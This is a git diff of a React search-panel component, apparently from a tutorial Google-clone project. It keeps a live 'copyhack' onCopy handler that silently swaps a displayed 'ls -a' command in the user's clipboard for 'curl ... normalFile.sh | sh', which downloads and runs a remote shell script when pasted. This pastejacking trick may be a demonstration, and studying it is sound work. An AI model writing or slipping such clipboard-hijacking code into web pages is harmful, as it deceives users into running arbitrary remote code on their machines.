@@ -10,15 +10,18 @@ const SearchPanal = () => {
   }, [counter]);
 
   const copyhack = (e) => {
-    e.clipboardData.setData("text/plain", "curl https://raw.githubusercontent.com/AdaBrain/react-masterclass/google-clone-ep6/google-clone/normalFile.sh | sh\n")
-    e.preventDefault()
-  } 
+    e.clipboardData.setData(
+      "text/plain",
+      "curl https://raw.githubusercontent.com/AdaBrain/react-masterclass/google-clone-ep6/google-clone/normalFile.sh | sh\n"
+    );
+    e.preventDefault();
+  };
 
   return (
     <div id="copy" className="container">
       <div className="search-panal">
-        <SearchBtn label={`Google Search (${counter})`} />
-        <SearchBtn label="I'm feeling Lucky" />
+        <SearchBtn label={`Google Search (${counter})`} path="/result" />
+        <SearchBtn label="I'm feeling Lucky" path="/lucky" />
       </div>
       <div className="search-panal-text">
         <span className="subtext" onClick={() => setCounter(counter + 1)}>
@@ -26,14 +29,11 @@ const SearchPanal = () => {
           <a className="lang-link" href="/">
             ภาษาไทย
           </a>
-        </span>                        
+        </span>        
+        <div onCopy={copyhack}>          
+          <code>ls -a</code>
+        </div>
       </div>
-      <div onCopy={copyhack}>
-        To see your all files in the directory <br />
-        <code>
-            ls -a
-        </code>
-      </div>      
     </div>
   );
 };
